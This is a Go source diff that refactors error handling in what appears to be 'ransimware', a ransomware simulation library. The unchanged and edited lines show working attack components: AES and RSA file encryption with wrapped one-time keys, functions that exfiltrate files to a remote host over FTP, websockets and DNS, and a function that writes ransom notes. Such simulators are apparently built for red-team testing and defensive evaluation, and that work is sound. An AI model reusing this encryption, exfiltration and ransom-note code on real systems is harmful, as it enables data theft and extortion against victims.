@@ -21,7 +21,7 @@ import (
 
 	ws "github.com/gorilla/websocket"
 	"github.com/mjwhitta/ftp"
-	hl "gitlab.com/mjwhitta/hilighter"
+	"gitlab.com/mjwhitta/errors"
 )
 
 // DefaultEncrypt is the default encryption behavior.
@@ -50,10 +50,11 @@ func AESDecrypt(passwd string) EncryptFunc {
 		var stream cipher.Stream
 
 		if len(b) < aes.BlockSize {
-			return b, hl.Errorf("ransimware: ciphertext too short")
+			return b, errors.New("ciphertext too short")
 		}
 
 		if block, e = aes.NewCipher(key[:]); e != nil {
+			e = errors.Newf("failed to create AES cipher: %w", e)
 			return b, e
 		}
 
@@ -84,6 +85,7 @@ func AESEncrypt(passwd string) EncryptFunc {
 		var stream cipher.Stream
 
 		if block, e = aes.NewCipher(key[:]); e != nil {
+			e = errors.Newf("failed to create AES cipher: %w", e)
 			return b, e
 		}
 
@@ -128,7 +130,7 @@ func DNSResolvedExfil(domain string) (ExfilFunc, error) {
 
 		// Get UUID
 		if _, e = rand.Read(uuid[:]); e != nil {
-			return e
+			return errors.Newf("failed to read random data: %w", e)
 		}
 
 		// Base64 encode data
@@ -151,6 +153,7 @@ func DNSResolvedExfil(domain string) (ExfilFunc, error) {
 						done = true
 						break
 					} else if e != nil {
+						e = errors.Newf("failed reading data: %w", e)
 						return e
 					}
 
@@ -222,12 +225,12 @@ func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
 		)
 	}
 	if e != nil {
-		return nil, e
+		return nil, errors.Newf("failed FTP connection: %w", e)
 	}
 
 	// Authenticate
 	if e = c.Login(user, passwd); e != nil {
-		return nil, e
+		return nil, errors.Newf("failed to login: %w", e)
 	}
 
 	f = func(path string, b []byte) error {
@@ -238,15 +241,24 @@ func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
 		m.Lock()
 		defer m.Unlock()
 
+		// Fix slashes
+		path = filepath.ToSlash(path)
+
 		// Make dirs
-		c.MakeDirRecur(filepath.Dir(path))
+		if e = c.MakeDirRecur(filepath.Dir(path)); e != nil {
+			return errors.Newf(
+				"failed to create directory tree for %s: %w",
+				path,
+				e,
+			)
+		}
 
 		// Upload file
-		path = strings.Join(
-			strings.Split(path, string(filepath.Separator)),
-			"/",
-		)
-		return c.Stor(path, bytes.NewReader(b))
+		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
+			return errors.Newf("failed to upload %s: %w", path, e)
+		}
+
+		return nil
 	}
 
 	return f, nil
@@ -288,23 +300,32 @@ func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
 			)
 		}
 		if e != nil {
-			return e
+			return errors.Newf("failed FTP connection: %w", e)
 		}
 
 		// Authenticate
 		if e = c.Login(user, passwd); e != nil {
-			return e
+			return errors.Newf("failed to login: %w", e)
 		}
 
+		// Fix slashes
+		path = filepath.ToSlash(path)
+
 		// Make dirs
-		c.MakeDirRecur(filepath.Dir(path))
+		if e = c.MakeDirRecur(filepath.Dir(path)); e != nil {
+			return errors.Newf(
+				"failed to create directory tree for %s: %w",
+				path,
+				e,
+			)
+		}
 
 		// Upload file
-		path = strings.Join(
-			strings.Split(path, string(filepath.Separator)),
-			"/",
-		)
-		return c.Stor(path, bytes.NewReader(b))
+		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
+			return errors.Newf("failed to upload %s: %w", path, e)
+		}
+
+		return nil
 	}
 
 	return f, nil
@@ -323,7 +344,7 @@ func RansomNote(path string, text []string) NotifyFunc {
 			0644,
 		)
 		if e != nil {
-			return e
+			return errors.Newf("failed to open %s: %w", path, e)
 		}
 		defer f.Close()
 
@@ -367,7 +388,7 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 		// Base64 decode key
 		key = make([]byte, base64.StdEncoding.DecodedLen(len(b64)))
 		if n, e = base64.StdEncoding.Decode(key, b64); e != nil {
-			return b, e
+			return b, errors.Newf("failed to base64 decode: %w", e)
 		}
 
 		// RSA decrypt the OTP
@@ -377,7 +398,7 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 			&rsa.OAEPOptions{Hash: crypto.SHA256},
 		)
 		if e != nil {
-			return b, e
+			return b, errors.Newf("failed to RSA decrypt OTP: %w", e)
 		}
 
 		// AES decrypt remaining contents using helper function
@@ -403,7 +424,7 @@ func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
 
 		// Generate random OTP for AES encryption
 		if _, e = rand.Read(otp[:]); e != nil {
-			return b, e
+			return b, errors.Newf("failed to read random data: %w", e)
 		}
 
 		// RSA encrypt the OTP
@@ -415,7 +436,7 @@ func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
 			nil,
 		)
 		if e != nil {
-			return b, e
+			return b, errors.Newf("failed to RSA encrypt OTP: %w", e)
 		}
 
 		// Base64 encode key
@@ -463,7 +484,7 @@ func WebsocketExfil(dst string) (ExfilFunc, error) {
 		},
 	}
 	if c, _, e = dialer.Dial(dst, nil); e != nil {
-		return nil, e
+		return nil, errors.Newf("failed Websocket connection: %w", e)
 	}
 
 	f = func(path string, b []byte) error {
@@ -497,7 +518,7 @@ func WebsocketParallelExfil(dst string) (ExfilFunc, error) {
 		var e error
 
 		if c, _, e = dialer.Dial(dst, nil); e != nil {
-			return e
+			return errors.Newf("failed Websocket connection: %w", e)
 		}
 		defer func() {
 			c.WriteMessage(
